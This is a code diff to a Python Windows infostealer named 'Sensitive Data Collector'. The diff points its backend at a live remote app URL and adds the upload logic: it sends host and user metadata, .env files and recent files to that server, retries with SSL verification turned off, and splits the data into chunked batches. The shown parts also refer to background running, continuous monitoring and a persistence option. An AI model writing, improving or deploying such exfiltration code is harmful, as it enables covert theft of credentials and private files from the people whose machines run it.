@@ -23,7 +23,9 @@ import ctypes
 import winreg
 
 # Backend server configuration
-BACKEND_URL = "http://localhost:5000"  # Change to actual server URL
+# BACKEND_URL = "http://localhost:5000"  # Change to actual server URL
+
+BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app" 
 API_ENDPOINT = f"{BACKEND_URL}/api/receive"
 BATCH_ENDPOINT = f"{BACKEND_URL}/api/receive/batch"
 
@@ -640,26 +642,80 @@ class SensitiveDataCollector:
     def send_data_to_backend(self, data, data_type='sensitive_data'):
         """Send collected data to backend server"""
         try:
+            # Clean the data to ensure it's JSON serializable
+            cleaned_data = self._make_json_serializable(data)
+            
             headers = {'Content-Type': 'application/json'}
+            url = f"{self.api_endpoint}?type={data_type}"
+            print(f"[*] Sending to: {url}")
+            
+            # Convert to JSON string first to verify it's valid
+            json_str = json.dumps(cleaned_data)
+            print(f"[*] Data size: {len(json_str)} bytes")
+            
             response = requests.post(
-                f"{self.api_endpoint}?type={data_type}",
-                json=data,
+                url,
+                data=json_str,  # Send as string instead of json parameter
                 headers=headers,
-                timeout=30
+                timeout=30,
+                verify=True
             )
             
-            if response.status_code == 201:
-                print(f"[+] Data sent successfully to backend")
+            print(f"[*] Response status: {response.status_code}")
+            if response.text:
+                print(f"[*] Response body: {response.text[:300]}")
+            
+            if response.status_code in [200, 201]:
+                print(f"[+] Data sent successfully to backend (Status: {response.status_code})")
                 return True
             else:
                 print(f"[-] Failed to send data: {response.status_code}")
+                print(f"    Response: {response.text[:200]}")
                 return False
-        except requests.exceptions.ConnectionError:
+        except requests.exceptions.ConnectionError as e:
             print(f"[-] Cannot connect to backend server at {self.backend_url}")
+            print(f"    Error: {str(e)[:100]}")
             return False
+        except requests.exceptions.SSLError as e:
+            print(f"[-] SSL verification failed: {str(e)[:100]}")
+            # Retry without SSL verification
+            try:
+                print("[*] Retrying without SSL verification...")
+                json_str = json.dumps(self._make_json_serializable(data))
+                response = requests.post(
+                    url,
+                    data=json_str,
+                    headers=headers,
+                    timeout=30,
+                    verify=False
+                )
+                if response.status_code in [200, 201]:
+                    print(f"[+] Data sent successfully (without SSL verification)")
+                    return True
+                else:
+                    print(f"[-] Still failed: {response.status_code}")
+                    return False
+            except Exception as e2:
+                print(f"[-] Retry failed: {str(e2)[:100]}")
+                return False
         except Exception as e:
-            print(f"[-] Error sending data: {e}")
+            print(f"[-] Error sending data: {str(e)[:200]}")
             return False
+    
+    def _make_json_serializable(self, obj):
+        """Convert non-serializable objects to serializable format"""
+        if isinstance(obj, dict):
+            return {k: self._make_json_serializable(v) for k, v in obj.items()}
+        elif isinstance(obj, (list, tuple)):
+            return [self._make_json_serializable(item) for item in obj]
+        elif isinstance(obj, Path):
+            return str(obj)
+        elif isinstance(obj, datetime):
+            return obj.isoformat()
+        elif isinstance(obj, (int, float, str, bool, type(None))):
+            return obj
+        else:
+            return str(obj)
     
     def run_collection(self):
         """Run the full collection process"""
@@ -687,11 +743,47 @@ class SensitiveDataCollector:
         print(f"    - .env files: {summary['env_files_found']}")
         print(f"    - Recent files: {summary['recent_files_found']}")
         
-        # Send to backend
+        # Send to backend - try single send first
         print("[*] Sending data to backend server...")
-        self.send_data_to_backend(collected_data)
+        if not self.send_data_to_backend(collected_data):
+            # If single send fails, try batch send with chunked data
+            print("[*] Attempting to send data in batches...")
+            self.send_data_in_batches(collected_data)
         
         return collected_data
+    
+    def send_data_in_batches(self, collected_data):
+        """Send data in smaller chunks if single send fails"""
+        data_types = collected_data.get('data_collected', {})
+        
+        # Send summary and metadata first
+        summary_data = {
+            'timestamp': collected_data['timestamp'],
+            'hostname': collected_data['hostname'],
+            'os': collected_data['os'],
+            'os_version': collected_data['os_version'],
+            'username': collected_data['username'],
+            'computer_name': collected_data['computer_name'],
+            'user_domain': collected_data['user_domain'],
+            'home_directory': collected_data['home_directory'],
+            'summary': collected_data.get('summary', {})
+        }
+        
+        print("[*] Sending metadata...")
+        self.send_data_to_backend(summary_data, data_type='metadata')
+        
+        # Send each data type separately
+        for data_type, data_list in data_types.items():
+            if isinstance(data_list, list) and data_list:
+                print(f"[*] Sending {data_type} ({len(data_list)} items)...")
+                # Send in chunks of 50 items at a time
+                for i in range(0, len(data_list), 50):
+                    chunk = data_list[i:i+50]
+                    self.send_data_to_backend({
+                        'type': data_type,
+                        'items': chunk,
+                        'chunk': f"{i//50 + 1}"
+                    }, data_type=data_type)
 
 
 def run_in_background():
@@ -783,6 +875,8 @@ def continuous_monitoring(interval_minutes=30):
 
 def main():
     """Main entry point for Windows"""
+    global BACKEND_URL, API_ENDPOINT, BATCH_ENDPOINT
+    
     import argparse
     
     parser = argparse.ArgumentParser(description='Sensitive Data Collector (Windows)')
@@ -801,12 +895,10 @@ def main():
     
     args = parser.parse_args()
     
-    # Update backend URL if specified
-    if args.server:
-        global BACKEND_URL, API_ENDPOINT, BATCH_ENDPOINT
-        BACKEND_URL = args.server
-        API_ENDPOINT = f"{BACKEND_URL}/api/receive"
-        BATCH_ENDPOINT = f"{BACKEND_URL}/api/receive/batch"
+    # Always update backend URL from args (use default if not specified)
+    BACKEND_URL = args.server
+    API_ENDPOINT = f"{BACKEND_URL}/api/receive"
+    BATCH_ENDPOINT = f"{BACKEND_URL}/api/receive/batch"
     
     # Add persistence if requested
     if args.persist:
